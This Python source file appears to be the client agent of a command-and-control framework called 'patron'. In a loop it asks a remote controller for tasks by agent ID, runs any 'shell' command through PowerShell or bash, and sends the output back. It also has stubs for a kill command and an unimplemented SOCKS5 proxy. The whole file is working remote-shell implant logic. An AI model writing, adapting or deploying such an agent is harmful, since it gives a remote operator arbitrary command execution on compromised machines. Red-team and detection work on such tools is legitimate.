import subprocess
import platform
import logging
import patronobuf as pb
from common import write_delimited, read_delimited

logger = logging.getLogger("patron_client")

def handle_command_loop(conn, agent_id):
    logger.info("Fetching commands to run")

    while True:
        req = pb.Request(
            type=pb.COMMAND,
            command=pb.CommandRequest(uuid=agent_id)
        )

        try:
            write_delimited(conn, req)
        except Exception as e:
            logger.error(f"Failed to send command request: {e}")
            return

        try:
            resp = read_delimited(conn, pb.Response)
        except Exception as e:
            logger.error(f"Failed to read command response: {e}")
            return

        if not resp.HasField("command_response"):
            logger.warning("No command response received")
            return

        cmd = resp.command_response
        logger.debug(f"CommandType: {cmd.commandtype}, Command: {cmd.command}")

        if cmd.commandtype == "socks":
            logger.warning("SOCKS5 not implemented in Python client")
            continue

        status = execute_command_request(cmd)

        if status.result == "2":
            logger.info("No commands to execute. Exiting command loop.")
            return

        status_req = pb.Request(
            type=pb.COMMAND_STATUS,
            command_status=status
        )

        try:
            write_delimited(conn, status_req)
        except Exception as e:
            logger.error(f"Failed to send command status: {e}")
            return

        try:
            ack = read_delimited(conn, pb.Response)
            logger.info("Command status sent, ack received")
        except Exception as e:
            logger.warning(f"Failed to read command status ack: {e}")
            return

def execute_command_request(cmd):
    if not cmd.command and not cmd.commandtype:
        logger.info("No command to execute")
        return pb.CommandStatusRequest(result="2")

    result = "1"

    if cmd.commandtype == "shell":
        output = run_shell_command(cmd.command)
    elif cmd.commandtype == "kill":
        output = "~Killed~"
    else:
        output = f"Unknown command type: {cmd.commandtype}"
        result = "2"

    return pb.CommandStatusRequest(
        uuid=cmd.uuid,
        commandid=cmd.commandid,
        result=result,
        output=output
    )

def run_shell_command(command):
    if platform.system().lower() == "windows":
        shell_cmd = ["powershell", "-Command", command]
    else:
        shell_cmd = ["bash", "-c", command]

    try:
        result = subprocess.run(shell_cmd, capture_output=True, text=True, check=False)
        logger.debug(f"Command executed: {command}")
        return result.stdout + result.stderr
    except Exception as e:
        logger.error(f"Error executing shell command: {e}")
        return str(e)
